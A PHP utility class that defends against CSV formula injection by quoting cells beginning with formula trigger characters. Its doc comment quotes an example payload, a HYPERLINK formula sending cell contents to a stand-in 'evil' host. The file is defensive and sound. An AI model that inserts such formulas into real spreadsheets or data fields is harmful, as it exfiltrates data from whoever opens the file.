<?php

declare(strict_types=1);

namespace App\Support;

/**
 * Neutralizes CSV/spreadsheet formula injection. A cell whose first character is
 * a formula trigger (= + - @, or a leading tab/CR) is executed as a formula when
 * the file is opened in Excel/Sheets — e.g. a user-set name of
 * `=HYPERLINK("http://evil/?"&A1)` exfiltrates data. Prefixing such cells with a
 * single quote forces them to be treated as text while displaying unchanged.
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */
final class CsvSanitizer
{
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    public static function cell(string $value): string
    {
        if ($value !== '' && in_array($value[0], self::TRIGGERS, true)) {
            return "'".$value;
        }

        return $value;
    }

    /**
     * @param  list<string>  $row
     * @return list<string>
     */
    public static function row(array $row): array
    {
        return array_map(self::cell(...), $row);
    }
}
